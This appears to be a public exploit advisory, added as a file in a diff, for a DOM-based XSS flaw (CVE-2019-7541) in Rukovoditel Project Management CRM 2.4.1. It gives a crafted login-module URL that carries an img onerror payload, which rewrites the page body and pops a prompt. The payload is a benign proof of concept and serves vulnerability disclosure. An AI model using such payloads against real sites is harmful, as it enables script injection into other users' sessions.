@@ -1,0 +1,47 @@
+####################################################################
+
+# Exploit Title : Rukovoditel Project Management CRM 2.4.1 - XSS Vulnerability (DOM BASED)
+# Author [ Discovered By ] : Mehmet EMIROGLU
+# Date : 29/01/2019
+# Vendor Homepage : https://www.rukovoditel.net/
+# Software Link : https://sourceforge.net/projects/rukovoditel/
+# Affected Versions : 2.4.1
+# Tested On : Wampp, Windows,Lampp
+# Category : WebApps
+# Exploit Risk : Medium
+# CVE : 2019-7541
+# Sofrware Description : Rukovoditel is a free web-based open-source
+project management
+  application. A far cry from traditional applications, Rukovoditel gives
+  users a broader and extensive approach to project management. Its
+  customization options allow users to create additional entities, modify
+  and specify the relationship between them, and generate the necessary
+reports.
+
+####################################################################
+
+# Impact :
+*********
+
+* This web application called as Rukovoditel Project Management CRM 2.4.1
+version.
+* first of all, delete the value string from the URL
+(...module=users%2flogin)
+* after, add the XSS code I've given below to the end of the URL.
+* The proof will be the picture below.
+* https://i.hizliresim.com/6aydM7.jpg
+
+####################################################################
+
+# PoC :
+****************************
+* XSS Code : "><img src=x
+onerror=document.body.innerHTML=location.hash>#"><img src=x
+onerror=prompt(123456789)>
+* Value : users%2flogin
+* Get Request : http://localhost/[PATH]/index.php?module=users%2flogin
+* URL : http://localhost/rukovoditel/index.php?module="><img src=x
+onerror=document.body.innerHTML=location.hash>#"><img src=x
+onerror=prompt(123456789)>
+
+####################################################################
